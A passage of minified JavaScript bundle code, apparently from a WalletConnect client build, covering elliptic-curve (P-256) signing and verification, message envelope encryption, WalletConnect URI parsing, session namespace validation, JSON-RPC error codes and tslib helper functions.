w=r.mul(w,E),E=r.add(L,f),w=r.sub(w,E),E=r.add(_,T),O=r.add(S,C),E=r.mul(E,O),O=r.add(N,f),E=r.sub(E,O),D=r.mul(F,w),O=r.mul(j,f),D=r.add(O,D),O=r.sub(N,D),D=r.add(N,D),$=r.mul(O,D),N=r.add(L,L),N=r.add(N,L),f=r.mul(F,f),w=r.mul(j,w),N=r.add(N,f),f=r.sub(L,f),f=r.mul(F,f),w=r.add(w,f),L=r.mul(N,w),$=r.add($,L),L=r.mul(E,w),O=r.mul(p,O),O=r.sub(O,L),L=r.mul(p,N),D=r.mul(E,D),D=r.add(D,L),new d(O,$,D)}subtract(b){return this.add(b.negate())}is0(){return this.equals(d.ZERO)}wNAF(b){return y.wNAFCached(this,b,d.normalizeZ)}multiplyUnsafe(b){const{endo:A,n:_}=e;fs("scalar",b,us,_);const T=d.ZERO;if(b===us)return T;if(this.is0()||b===wr)return this;if(!A||y.hasPrecomputes(this))return y.wNAFCachedUnsafe(this,b,d.normalizeZ);let{k1neg:P,k1:S,k2neg:C,k2:O}=A.splitScalar(b),$=T,D=T,F=this;for(;S>us||O>us;)S&wr&&($=$.add(F)),O&wr&&(D=D.add(F)),F=F.double(),S>>=wr,O>>=wr;return P&&($=$.negate()),C&&(D=D.negate()),D=new d(r.mul(D.px,A.beta),D.py,D.pz),$.add(D)}multiply(b){const{endo:A,n:_}=e;fs("scalar",b,wr,_);let T,P;if(A){const{k1neg:S,k1:C,k2neg:O,k2:$}=A.splitScalar(b);let{p:D,f:F}=this.wNAF(C),{p:j,f:L}=this.wNAF($);D=y.constTimeNegate(S,D),j=y.constTimeNegate(O,j),j=new d(r.mul(j.px,A.beta),j.py,j.pz),T=D.add(j),P=F.add(L)}else{const{p:S,f:C}=this.wNAF(b);T=S,P=C}return d.normalizeZ([T,P])[0]}multiplyAndAddUnsafe(b,A,_){const T=d.BASE,P=(C,O)=>O===us||O===wr||!C.equals(T)?C.multiplyUnsafe(O):C.multiply(O),S=P(this,A).add(P(b,_));return S.is0()?void 0:S}toAffine(b){return l(this,b)}isTorsionFree(){const{h:b,isTorsionFree:A}=e;if(b===wr)return!0;if(A)return A(d,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:b,clearCofactor:A}=e;return b===wr?this:A?A(d,this):this.multiplyUnsafe(e.h)}toRawBytes(b=!0){return gc("isCompressed",b),this.assertValidity(),i(d,this,b)}toHex(b=!0){return gc("isCompressed",b),mc(this.toRawBytes(b))}}d.BASE=new d(e.Gx,e.Gy,r.ONE),d.ZERO=new d(r.ZERO,r.ONE,r.ZERO);const g=e.nBitLength,y=B6(d,e.endo?Math.ceil(g/2):g);return{CURVE:e,ProjectivePoint:d,normPrivateKeyToScalar:c,weierstrassEquation:o,isWithinCurveOrder:a}}function Y6(t){const e=bC(t);return Fc(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function J6(t){const e=Y6(t),{Fp:r,n}=e,i=r.BYTES+1,s=2*r.BYTES+1;function o(f){return hn(f,n)}function a(f){return Um(f,n)}const{ProjectivePoint:c,normPrivateKeyToScalar:u,weierstrassEquation:l,isWithinCurveOrder:h}=Q6({...e,toBytes(f,p,w){const E=p.toAffine(),x=r.toBytes(E.x),R=Ku;return gc("isCompressed",w),w?R(Uint8Array.from([p.hasEvenY()?2:3]),x):R(Uint8Array.from([4]),x,r.toBytes(E.y))},fromBytes(f){const p=f.length,w=f[0],E=f.subarray(1);if(p===i&&(w===2||w===3)){const x=Go(E);if(!Of(x,wr,r.ORDER))throw new Error("Point is not on curve");const R=l(x);let B;try{B=r.sqrt(R)}catch(v){const M=v instanceof Error?": "+v.message:"";throw new Error("Point is not on curve"+M)}const k=(B&wr)===wr;return(w&1)===1!==k&&(B=r.neg(B)),{x,y:B}}else if(p===s&&w===4){const x=r.fromBytes(E.subarray(0,r.BYTES)),R=r.fromBytes(E.subarray(r.BYTES,2*r.BYTES));return{x,y:R}}else{const x=i,R=s;throw new Error("invalid Point, expected length of "+x+", or uncompressed "+R+", got "+p)}}}),d=f=>mc(wc(f,e.nByteLength));function g(f){const p=n>>wr;return f>p}function y(f){return g(f)?o(-f):f}const m=(f,p,w)=>Go(f.slice(p,w));class b{constructor(p,w,E){this.r=p,this.s=w,this.recovery=E,this.assertValidity()}static fromCompact(p){const w=e.nByteLength;return p=Cn("compactSignature",p,w*2),new b(m(p,0,w),m(p,w,2*w))}static fromDER(p){const{r:w,s:E}=cs.toSig(Cn("DER",p));return new b(w,E)}assertValidity(){fs("r",this.r,wr,n),fs("s",this.s,wr,n)}addRecoveryBit(p){return new b(this.r,this.s,p)}recoverPublicKey(p){const{r:w,s:E,recovery:x}=this,R=C(Cn("msgHash",p));if(x==null||![0,1,2,3].includes(x))throw new Error("recovery id invalid");const B=x===2||x===3?w+e.n:w;if(B>=r.ORDER)throw new Error("recovery id 2 or 3 invalid");const k=(x&1)===0?"02":"03",v=c.fromHex(k+d(B)),M=a(B),V=o(-R*M),I=o(E*M),z=c.BASE.multiplyAndAddUnsafe(v,V,I);if(!z)throw new Error("point at infinify");return z.assertValidity(),z}hasHighS(){return g(this.s)}normalizeS(){return this.hasHighS()?new b(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return yc(this.toDERHex())}toDERHex(){return cs.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return yc(this.toCompactHex())}toCompactHex(){return d(this.r)+d(this.s)}}const A={isValidPrivateKey(f){try{return u(f),!0}catch{return!1}},normPrivateKeyToScalar:u,randomPrivateKey:()=>{const f=mC(e.n);return k6(e.randomBytes(f),e.n)},precompute(f=8,p=c.BASE){return p._setWindowSize(f),p.multiply(BigInt(3)),p}};function _(f,p=!0){return c.fromPrivateKey(f).toRawBytes(p)}function T(f){const p=ra(f),w=typeof f=="string",E=(p||w)&&f.length;return p?E===i||E===s:w?E===2*i||E===2*s:f instanceof c}function P(f,p,w=!0){if(T(f))throw new Error("first arg must be private key");if(!T(p))throw new Error("second arg must be public key");return c.fromHex(p).multiply(u(f)).toRawBytes(w)}const S=e.bits2int||function(f){if(f.length>8192)throw new Error("input is too large");const p=Go(f),w=f.length*8-e.nBitLength;return w>0?p>>BigInt(w):p},C=e.bits2int_modN||function(f){return o(S(f))},O=sy(e.nBitLength);function $(f){return fs("num < 2^"+e.nBitLength,f,us,O),wc(f,e.nByteLength)}function D(f,p,w=F){if(["recovered","canonical"].some(W=>W in w))throw new Error("sign() legacy options not supported");const{hash:E,randomBytes:x}=e;let{lowS:R,prehash:B,extraEntropy:k}=w;R==null&&(R=!0),f=Cn("msgHash",f),Hb(w),B&&(f=Cn("prehashed msgHash",E(f)));const v=C(f),M=u(p),V=[$(M),$(v)];if(k!=null&&k!==!1){const W=k===!0?x(r.BYTES):k;V.push(Cn("extraEntropy",W))}const I=Ku(...V),z=v;function G(W){const K=S(W);if(!h(K))return;const ae=a(K),ee=c.BASE.multiply(K).toAffine(),J=o(ee.x);if(J===us)return;const Te=o(ae*o(z+J*M));if(Te===us)return;let ie=(ee.x===J?0:2)|Number(ee.y&wr),ye=Te;return R&&g(Te)&&(ye=y(Te),ie^=1),new b(J,ye,ie)}return{seed:I,k2sig:G}}const F={lowS:e.lowS,prehash:!1},j={lowS:e.lowS,prehash:!1};function L(f,p,w=F){const{seed:E,k2sig:x}=D(f,p,w),R=e;return hC(R.hash.outputLen,R.nByteLength,R.hmac)(E,x)}c.BASE._setWindowSize(8);function N(f,p,w,E=j){var Te;const x=f;p=Cn("msgHash",p),w=Cn("publicKey",w);const{lowS:R,prehash:B,format:k}=E;if(Hb(E),"strict"in E)throw new Error("options.strict was renamed to lowS");if(k!==void 0&&k!=="compact"&&k!=="der")throw new Error("format must be compact or der");const v=typeof x=="string"||ra(x),M=!v&&!k&&typeof x=="object"&&x!==null&&typeof x.r=="bigint"&&typeof x.s=="bigint";if(!v&&!M)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let V,I;try{if(M&&(V=new b(x.r,x.s)),v){try{k!=="compact"&&(V=b.fromDER(x))}catch(ie){if(!(ie instanceof cs.Err))throw ie}!V&&k!=="der"&&(V=b.fromCompact(x))}I=c.fromHex(w)}catch{return!1}if(!V||R&&V.hasHighS())return!1;B&&(p=e.hash(p));const{r:z,s:G}=V,W=C(p),K=a(G),ae=o(W*K),ee=o(z*K),J=(Te=c.BASE.multiplyAndAddUnsafe(I,ae,ee))==null?void 0:Te.toAffine();return J?o(J.x)===z:!1}return{CURVE:e,getPublicKey:_,getSharedSecret:P,sign:L,verify:N,ProjectivePoint:c,Signature:b,utils:A}}function Z6(t){return{hash:t,hmac:(e,...r)=>Nf(t,e,r5(...r)),randomBytes:Lc}}function X6(t,e){const r=n=>J6({...t,...Z6(n)});return{...r(e),create:r}}const vC=pC(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff")),e8=vC.create(BigInt("-3")),t8=BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),r8=X6({a:e8,b:t8,Fp:vC,n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),h:BigInt(1),lowS:!1},eh),EC="base10",Jr="base16",hi="base64pad",zs="base64url",rh="utf8",AC=0,ps=1,nh=2,n8=0,Gb=1,Su=12,oy=32;function i8(){const t=Lm.utils.randomPrivateKey(),e=Lm.getPublicKey(t);return{privateKey:fn(t,Jr),publicKey:fn(e,Jr)}}function Fm(){const t=Lc(oy);return fn(t,Jr)}function s8(t,e){const r=Lm.getSharedSecret(Hn(t,Jr),Hn(e,Jr)),n=u6(eh,r,void 0,void 0,oy);return fn(n,Jr)}function ad(t){const e=eh(Hn(t,Jr));return fn(e,Jr)}function Oi(t){const e=eh(Hn(t,rh));return fn(e,Jr)}function _C(t){return Hn(`${t}`,EC)}function na(t){return Number(fn(t,EC))}function CC(t){return t.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function IC(t){const e=t.replace(/-/g,"+").replace(/_/g,"/"),r=(4-e.length%4)%4;return e+"=".repeat(r)}function o8(t){const e=_C(typeof t.type<"u"?t.type:AC);if(na(e)===ps&&typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const r=typeof t.senderPublicKey<"u"?Hn(t.senderPublicKey,Jr):void 0,n=typeof t.iv<"u"?Hn(t.iv,Jr):Lc(Su),i=Hn(t.symKey,Jr),s=cC(i,n).encrypt(Hn(t.message,rh)),o=xC({type:e,sealed:s,iv:n,senderPublicKey:r});return t.encoding===zs?CC(o):o}function a8(t){const e=Hn(t.symKey,Jr),{sealed:r,iv:n}=Qu({encoded:t.encoded,encoding:t.encoding}),i=cC(e,n).decrypt(r);if(i===null)throw new Error("Failed to decrypt");return fn(i,rh)}function c8(t,e){const r=_C(nh),n=Lc(Su),i=Hn(t,rh),s=xC({type:r,sealed:i,iv:n});return e===zs?CC(s):s}function u8(t,e){const{sealed:r}=Qu({encoded:t,encoding:e});return fn(r,rh)}function xC(t){if(na(t.type)===nh)return fn(xu([t.type,t.sealed]),hi);if(na(t.type)===ps){if(typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return fn(xu([t.type,t.senderPublicKey,t.iv,t.sealed]),hi)}return fn(xu([t.type,t.iv,t.sealed]),hi)}function Qu(t){const e=(t.encoding||hi)===zs?IC(t.encoded):t.encoded,r=Hn(e,hi),n=r.slice(n8,Gb),i=Gb;if(na(n)===ps){const c=i+oy,u=c+Su,l=r.slice(i,c),h=r.slice(c,u),d=r.slice(u);return{type:n,sealed:d,iv:h,senderPublicKey:l}}if(na(n)===nh){const c=r.slice(i),u=Lc(Su);return{type:n,sealed:c,iv:u}}const s=i+Su,o=r.slice(i,s),a=r.slice(s);return{type:n,sealed:a,iv:o}}function l8(t,e){const r=Qu({encoded:t,encoding:e==null?void 0:e.encoding});return SC({type:na(r.type),senderPublicKey:typeof r.senderPublicKey<"u"?fn(r.senderPublicKey,Jr):void 0,receiverPublicKey:e==null?void 0:e.receiverPublicKey})}function SC(t){const e=(t==null?void 0:t.type)||AC;if(e===ps){if(typeof(t==null?void 0:t.senderPublicKey)>"u")throw new Error("missing sender public key");if(typeof(t==null?void 0:t.receiverPublicKey)>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:t==null?void 0:t.senderPublicKey,receiverPublicKey:t==null?void 0:t.receiverPublicKey}}function Vb(t){return t.type===ps&&typeof t.senderPublicKey=="string"&&typeof t.receiverPublicKey=="string"}function Kb(t){return t.type===nh}function h8(t){const e=Buffer.from(t.x,"base64"),r=Buffer.from(t.y,"base64");return xu([new Uint8Array([4]),e,r])}function d8(t,e){const[r,n,i]=t.split("."),s=Buffer.from(IC(i),"base64");if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32),a=s.slice(32,64),c=`${r}.${n}`,u=eh(c),l=h8(e);if(!r8.verify(xu([o,a]),u,l))throw new Error("Invalid signature");return Am(t).payload}const f8="irn";function Dd(t){return(t==null?void 0:t.relay)||{protocol:f8}}function Eu(t){const e=wD[t];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${t}`);return e}function p8(t,e="-"){const r={},n="relay"+e;return Object.keys(t).forEach(i=>{if(i.startsWith(n)){const s=i.replace(n,""),o=t[i];r[s]=o}}),r}function Qb(t){if(!t.includes("wc:")){const u=Q_(t);u!=null&&u.includes("wc:")&&(t=u)}t=t.includes("wc://")?t.replace("wc://",""):t,t=t.includes("wc:")?t.replace("wc:",""):t;const e=t.indexOf(":"),r=t.indexOf("?")!==-1?t.indexOf("?"):void 0,n=t.substring(0,e),i=t.substring(e+1,r).split("@"),s=typeof r<"u"?t.substring(r):"",o=new URLSearchParams(s),a={};o.forEach((u,l)=>{a[l]=u});const c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:n,topic:g8(i[0]),version:parseInt(i[1],10),symKey:a.symKey,relay:p8(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function g8(t){return t.startsWith("//")?t.substring(2):t}function m8(t,e="-"){const r="relay",n={};return Object.keys(t).forEach(i=>{const s=i,o=r+e+s;t[s]&&(n[o]=t[s])}),n}function Yb(t){const e=new URLSearchParams,r=m8(t.relay);Object.keys(r).sort().forEach(i=>{e.set(i,r[i])}),e.set("symKey",t.symKey),t.expiryTimestamp&&e.set("expiryTimestamp",t.expiryTimestamp.toString()),t.methods&&e.set("methods",t.methods.join(","));const n=e.toString();return`${t.protocol}:${t.topic}@${t.version}?${n}`}function Dh(t,e,r){return`${t}?wc_ev=${r}&topic=${e}`}function jc(t){const e=[];return t.forEach(r=>{const[n,i]=r.split(":");e.push(`${n}:${i}`)}),e}function y8(t){const e=[];return Object.values(t).forEach(r=>{e.push(...jc(r.accounts))}),e}function w8(t,e){const r=[];return Object.values(t).forEach(n=>{jc(n.accounts).includes(e)&&r.push(...n.methods)}),r}function b8(t,e){const r=[];return Object.values(t).forEach(n=>{jc(n.accounts).includes(e)&&r.push(...n.events)}),r}function ay(t){return t.includes(":")}function Au(t){return ay(t)?t.split(":")[0]:t}function v8(t){const e={};return t==null||t.forEach(r=>{var n;const[i,s]=r.split(":");e[i]||(e[i]={accounts:[],chains:[],events:[],methods:[]}),e[i].accounts.push(r),(n=e[i].chains)==null||n.push(`${i}:${s}`)}),e}function Jb(t,e){e=e.map(n=>n.replace("did:pkh:",""));const r=v8(e);for(const[n,i]of Object.entries(r))i.methods?i.methods=sd(i.methods,t):i.methods=t,i.events=["chainChanged","accountsChanged"];return r}const E8={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},A8={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function oe(t,e){const{message:r,code:n}=A8[t];return{message:e?`${r} ${e}`:r,code:n}}function ht(t,e){const{message:r,code:n}=E8[t];return{message:e?`${r} ${e}`:r,code:n}}function Js(t,e){return!!Array.isArray(t)}function Yu(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}function Or(t){return typeof t>"u"}function ar(t,e){return e&&Or(t)?!0:typeof t=="string"&&!!t.trim().length}function cy(t,e){return e&&Or(t)?!0:typeof t=="number"&&!isNaN(t)}function _8(t,e){const{requiredNamespaces:r}=e,n=Object.keys(t.namespaces),i=Object.keys(r);let s=!0;return Uo(i,n)?(n.forEach(o=>{const{accounts:a,methods:c,events:u}=t.namespaces[o],l=jc(a),h=r[o];(!Uo(H_(o,h),l)||!Uo(h.methods,c)||!Uo(h.events,u))&&(s=!1)}),s):!1}function Md(t){return ar(t,!1)&&t.includes(":")?t.split(":").length===2:!1}function C8(t){if(ar(t,!1)&&t.includes(":")){const e=t.split(":");if(e.length===3){const r=e[0]+":"+e[1];return!!e[2]&&Md(r)}}return!1}function I8(t){function e(r){try{return typeof new URL(r)<"u"}catch{return!1}}try{if(ar(t,!1)){if(e(t))return!0;const r=Q_(t);return e(r)}}catch{}return!1}function x8(t){var e;return(e=t==null?void 0:t.proposer)==null?void 0:e.publicKey}function S8(t){return t==null?void 0:t.topic}function N8(t,e){let r=null;return ar(t==null?void 0:t.publicKey,!1)||(r=oe("MISSING_OR_INVALID",`${e} controller public key should be a string`)),r}function Zb(t){let e=!0;return Js(t)?t.length&&(e=t.every(r=>ar(r,!1))):e=!1,e}function T8(t,e,r){let n=null;return Js(e)&&e.length?e.forEach(i=>{n||Md(i)||(n=ht("UNSUPPORTED_CHAINS",`${r}, chain ${i} should be a string and conform to "namespace:chainId" format`))}):Md(t)||(n=ht("UNSUPPORTED_CHAINS",`${r}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),n}function P8(t,e,r){let n=null;return Object.entries(t).forEach(([i,s])=>{if(n)return;const o=T8(i,H_(i,s),`${e} ${r}`);o&&(n=o)}),n}function R8(t,e){let r=null;return Js(t)?t.forEach(n=>{r||C8(n)||(r=ht("UNSUPPORTED_ACCOUNTS",`${e}, account ${n} should be a string and conform to "namespace:chainId:address" format`))}):r=ht("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),r}function O8(t,e){let r=null;return Object.values(t).forEach(n=>{if(r)return;const i=R8(n==null?void 0:n.accounts,`${e} namespace`);i&&(r=i)}),r}function k8(t,e){let r=null;return Zb(t==null?void 0:t.methods)?Zb(t==null?void 0:t.events)||(r=ht("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):r=ht("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),r}function NC(t,e){let r=null;return Object.values(t).forEach(n=>{if(r)return;const i=k8(n,`${e}, namespace`);i&&(r=i)}),r}function D8(t,e,r){let n=null;if(t&&Yu(t)){const i=NC(t,e);i&&(n=i);const s=P8(t,e,r);s&&(n=s)}else n=oe("MISSING_OR_INVALID",`${e}, ${r} should be an object with data`);return n}function ng(t,e){let r=null;if(t&&Yu(t)){const n=NC(t,e);n&&(r=n);const i=O8(t,e);i&&(r=i)}else r=oe("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return r}function TC(t){return ar(t.protocol,!0)}function M8(t,e){let r=!1;return t?t&&Js(t)&&t.length&&t.forEach(n=>{r=TC(n)}):r=!0,r}function B8(t){return typeof t=="number"}function un(t){return typeof t<"u"&&typeof t!==null}function U8(t){return!(!t||typeof t!="object"||!t.code||!cy(t.code,!1)||!t.message||!ar(t.message,!1))}function $8(t){return!(Or(t)||!ar(t.method,!1))}function L8(t){return!(Or(t)||Or(t.result)&&Or(t.error)||!cy(t.id,!1)||!ar(t.jsonrpc,!1))}function F8(t){return!(Or(t)||!ar(t.name,!1))}function Xb(t,e){return!(!Md(e)||!y8(t).includes(e))}function j8(t,e,r){return ar(r,!1)?w8(t,e).includes(r):!1}function q8(t,e,r){return ar(r,!1)?b8(t,e).includes(r):!1}function ev(t,e,r){let n=null;const i=z8(t),s=H8(e),o=Object.keys(i),a=Object.keys(s),c=tv(Object.keys(t)),u=tv(Object.keys(e)),l=c.filter(h=>!u.includes(h));return l.length&&(n=oe("NON_CONFORMING_NAMESPACES",`${r} namespaces keys don't satisfy requiredNamespaces.
      Required: ${l.toString()}
      Received: ${Object.keys(e).toString()}`)),Uo(o,a)||(n=oe("NON_CONFORMING_NAMESPACES",`${r} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(h=>{if(!h.includes(":")||n)return;const d=jc(e[h].accounts);d.includes(h)||(n=oe("NON_CONFORMING_NAMESPACES",`${r} namespaces accounts don't satisfy namespace accounts for ${h}
        Required: ${h}
        Approved: ${d.toString()}`))}),o.forEach(h=>{n||(Uo(i[h].methods,s[h].methods)?Uo(i[h].events,s[h].events)||(n=oe("NON_CONFORMING_NAMESPACES",`${r} namespaces events don't satisfy namespace events for ${h}`)):n=oe("NON_CONFORMING_NAMESPACES",`${r} namespaces methods don't satisfy namespace methods for ${h}`))}),n}function z8(t){const e={};return Object.keys(t).forEach(r=>{var n;r.includes(":")?e[r]=t[r]:(n=t[r].chains)==null||n.forEach(i=>{e[i]={methods:t[r].methods,events:t[r].events}})}),e}function tv(t){return[...new Set(t.map(e=>e.includes(":")?e.split(":")[0]:e))]}function H8(t){const e={};return Object.keys(t).forEach(r=>{if(r.includes(":"))e[r]=t[r];else{const n=jc(t[r].accounts);n==null||n.forEach(i=>{e[i]={accounts:t[r].accounts.filter(s=>s.includes(`${i}:`)),methods:t[r].methods,events:t[r].events}})}}),e}function W8(t,e){return cy(t,!1)&&t<=e.max&&t>=e.min}function rv(){const t=Zl();return new Promise(e=>{switch(t){case Tn.browser:e(G8());break;case Tn.reactNative:e(V8());break;case Tn.node:e(K8());break;default:e(!0)}})}function G8(){return Jl()&&(navigator==null?void 0:navigator.onLine)}async function V8(){if(uo()&&typeof global<"u"&&global!=null&&global.NetInfo){const t=await(global==null?void 0:global.NetInfo.fetch());return t==null?void 0:t.isConnected}return!0}function K8(){return!0}function Q8(t){switch(Zl()){case Tn.browser:Y8(t);break;case Tn.reactNative:J8(t);break}}function Y8(t){!uo()&&Jl()&&(window.addEventListener("online",()=>t(!0)),window.addEventListener("offline",()=>t(!1)))}function J8(t){uo()&&typeof global<"u"&&global!=null&&global.NetInfo&&(global==null||global.NetInfo.addEventListener(e=>t(e==null?void 0:e.isConnected)))}const ig={};class su{static get(e){return ig[e]}static set(e,r){ig[e]=r}static delete(e){delete ig[e]}}const Z8="PARSE_ERROR",X8="INVALID_REQUEST",eM="METHOD_NOT_FOUND",tM="INVALID_PARAMS",PC="INTERNAL_ERROR",uy="SERVER_ERROR",rM=[-32700,-32600,-32601,-32602,-32603],Nu={[Z8]:{code:-32700,message:"Parse error"},[X8]:{code:-32600,message:"Invalid Request"},[eM]:{code:-32601,message:"Method not found"},[tM]:{code:-32602,message:"Invalid params"},[PC]:{code:-32603,message:"Internal error"},[uy]:{code:-32e3,message:"Server error"}},RC=uy;function nM(t){return rM.includes(t)}function nv(t){return Object.keys(Nu).includes(t)?Nu[t]:Nu[RC]}function iM(t){const e=Object.values(Nu).find(r=>r.code===t);return e||Nu[RC]}function OC(t,e,r){return t.message.includes("getaddrinfo ENOTFOUND")||t.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${r} RPC url at ${e}`):t}var sg={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var jm=function(t,e){return jm=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(r,n){r.__proto__=n}||function(r,n){for(var i in n)n.hasOwnProperty(i)&&(r[i]=n[i])},jm(t,e)};function sM(t,e){jm(t,e);function r(){this.constructor=t}t.prototype=e===null?Object.create(e):(r.prototype=e.prototype,new r)}var qm=function(){return qm=Object.assign||function(e){for(var r,n=1,i=arguments.length;n<i;n++){r=arguments[n];for(var s in r)Object.prototype.hasOwnProperty.call(r,s)&&(e[s]=r[s])}return e},qm.apply(this,arguments)};function oM(t,e){var r={};for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&e.indexOf(n)<0&&(r[n]=t[n]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,n=Object.getOwnPropertySymbols(t);i<n.length;i++)e.indexOf(n[i])<0&&Object.prototype.propertyIsEnumerable.call(t,n[i])&&(r[n[i]]=t[n[i]]);return r}function aM(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s}function cM(t,e){return function(r,n){e(r,n,t)}}function uM(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function lM(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})}function hM(t,e){var r={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},n,i,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(u){return function(l){return c([u,l])}}function c(u){if(n)throw new TypeError("Generator is already executing.");for(;r;)try{if(n=1,i&&(s=u[0]&2?i.return:u[0]?i.throw||((s=i.return)&&s.call(i),0):i.next)&&!(s=s.call(i,u[1])).done)return s;switch(i=0,s&&(u=[u[0]&2,s.value]),u[0]){case 0:case 1:s=u;break;case 4:return r.label++,{value:u[1],done:!1};case 5:r.label++,i=u[1],u=[0];continue;case 7:u=r.ops.pop(),r.trys.pop();continue;default:if(s=r.trys,!(s=s.length>0&&s[s.length-1])&&(u[0]===6||u[0]===2)){r=0;continue}if(u[0]===3&&(!s||u[1]>s[0]&&u[1]<s[3])){r.label=u[1];break}if(u[0]===6&&r.label<s[1]){r.label=s[1],s=u;break}if(s&&r.label<s[2]){r.label=s[2],r.ops.push(u);break}s[2]&&r.ops.pop(),r.trys.pop();continue}u=e.call(t,r)}catch(l){u=[6,l],i=0}finally{n=s=0}if(u[0]&5)throw u[1];return{value:u[0]?u[1]:void 0,done:!0}}}function dM(t,e,r,n){n===void 0&&(n=r),t[n]=e[r]}function fM(t,e){for(var r in t)r!=="default"&&!e.hasOwnProperty(r)&&(e[r]=t[r])}function zm(t){var e=typeof Symbol=="function"&&Symbol.iterator,r=e&&t[e],n=0;if(r)return r.call(t);if(t&&typeof 